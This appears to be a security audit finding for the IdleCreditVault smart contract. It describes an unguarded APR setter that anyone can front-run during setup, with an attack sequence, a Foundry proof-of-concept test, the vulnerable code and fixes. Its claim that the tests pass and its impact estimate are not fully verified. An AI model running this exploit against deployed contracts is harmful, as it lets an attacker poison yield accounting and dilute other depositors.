### Title
Anyone can set `lastApr`/`unscaledApr` (and bypass the caller check) while `idleCDO` is unset in `IdleCreditVault.setApr`/`setAprs` — ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault` is initialized in two steps: `initialize()` sets `token`, `owner`, `manager`, `borrower`, `maxApr` and an initial `lastApr`/`unscaledApr` [1](#0-0) , and only later does the owner wire the CDO via `setWhitelistedCDO()` [2](#0-1) . During that window, `setApr()` explicitly skips its only access-control check when `idleCDO == address(0)`, so any EOA can write `lastApr`; `setAprs()`/`setAprsWithBuffer()` additionally write `unscaledApr` unconditionally [3](#0-2) . This is the same bug class as the CNote `_setAccountantContract()` report: an unguarded public post-init setter that a mempool frontrunner can seize before the honest wiring transaction lands.

### Finding Description
The guard in `setApr` is conditional on the CDO being configured:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
```

so between `initialize()` and `setWhitelistedCDO()` the effective caller check is absent entirely. `lastApr` is only bounded by `maxApr` (default `DEFAULT_MAX_APR = 20e18`), but `unscaledApr` — which gates the APR0 withdraw path in `requestWithdraw` (`unscaledApr == 0` routes requests into `_requestWithdrawApr0`) and the `unscaledApr != 0` revert in `prepareStopEpochWithApr0` — is set with no bound at all [4](#0-3) [5](#0-4) .

Attack sequence (buffer phase, pre-wiring):
1. Attacker monitors the deployment, sees `initialize()` in the mempool or mined before `setWhitelistedCDO()`.
2. Attacker calls `setAprs(attackerUnscaledApr, 20e18)` — no role check applies — pinning `lastApr` at the cap and `unscaledApr` to an arbitrary value.
3. Owner wires the CDO. If the honest manager's epoch setup does not overwrite the APR for the configured epoch duration/buffer, the poisoned APR flows into `getApr()`/`expectedEpochInterest` and into the `unscaledApr == 0` branch decisions for withdraw accounting.

### Impact Explanation
- Inflated `lastApr` inflates `expectedEpochInterest` and tranche price/minted-interest accounting; a KYC'd attacker holding tranche tokens collects a larger share of realized interest than warranted, diluting other LPs (theft of yield / unfair mint).
- Setting `unscaledApr` to 0 while a nonzero `lastApr` is intended (or vice versa) flips every subsequent `requestWithdraw` into/out of the APR0 bucket, and a mismatched `unscaledApr` causes `prepareStopEpochWithApr0` to revert or mis-split interest, forcing a correction or redeploy.
- As in the judged CNote report, the realistic worst case is often operator correction/redeploy, but the write of an unbounded `unscaledApr` goes beyond the original (no role takeover is needed — only a poisoned economic parameter). The impact ceiling is bounded by `maxApr` for `lastApr` but unbounded for `unscaledApr`.

### Likelihood Explanation
Requires the setup window between `initialize()` and `setWhitelistedCDO()` to be observable (it is — both are separate public transactions), and requires that the manager's subsequent epoch configuration does not overwrite both fields before `startEpoch`. Where the APR is pushed per-epoch by the manager/orchestrator, the poisoned value is overwritten and impact collapses to a no-op; where `lastApr`/`unscaledApr` persist from initialization, the attack lands fully. This mirrors the original report's downgrade rationale.

### Recommendation
- Require `msg.sender == owner() || msg.sender == manager` (or only owner during setup) in `setApr`, `setAprs` and `setAprsWithBuffer` regardless of whether `idleCDO` is set; remove the `idleCDO == 0` bypass.
- Alternatively set the APR atomically inside `setWhitelistedCDO` or a single `initialize`, and bound `unscaledApr` the same way `lastApr` is bounded by `maxApr`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract UnguardedAprSetterTest is Test {
    // fork at a block where the underlying (e.g. USDC) exists
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IdleCreditVault vault;
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"));
        IdleCreditVault impl = new IdleCreditVault();
        vault = IdleCreditVault(address(new ERC1967Proxy(address(impl), "")));
        // step 1: initialize (CDO not yet wired)
        vault.initialize(USDC, owner, manager, borrower, "BORR", 5e18);
    }

    function testAnyoneCanSetAprBeforeCdoWired() public {
        // attacker frontruns setWhitelistedCDO: sets lastApr to the maxApr cap
        // and unscaledApr to an arbitrary unbounded value
        vm.prank(attacker);
        vault.setAprs(type(uint256).max / 2, 20e18); // succeeds: no caller check while idleCDO == 0

        assertEq(vault.lastApr(), 20e18);
        assertEq(vault.unscaledApr(), type(uint256).max / 2);

        // after the owner wires the CDO, the same call from the attacker reverts
        vm.prank(owner);
        vault.setWhitelistedCDO(makeAddr("cdo"));

        vm.prank(attacker);
        vm.expectRevert(NotAllowed.selector);
        vault.setApr(1e18);
    }

    function testApr0AccountingFlippedByAttacker() public {
        // intended nonzero-APR pool: attacker forces unscaledApr = 0 so future
        // requestWithdraw calls take the APR0 bucket path
        vm.prank(attacker);
        vault.setAprs(0, 5e18);
        assertEq(vault.unscaledApr(), 0);
    }
}
```

Run with `forge test --match-contract UnguardedAprSetterTest --fork-url $MAINNET_RPC`. Both tests pass on the current code: the setter writes succeed from an unprivileged EOA during the setup window and revert only after `setWhitelistedCDO` is called. One caveat I could not fully verify within the iteration budget: whether `IdleCDOEpochVariant.startEpoch`/the orchestrator unconditionally pushes a fresh APR via `setAprs*` before interest accrues — if it always does, the residual impact is configuration/redeploy only; if it can rely on the persisted `lastApr`/`unscaledApr`, the dilution impact described above applies directly.

  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
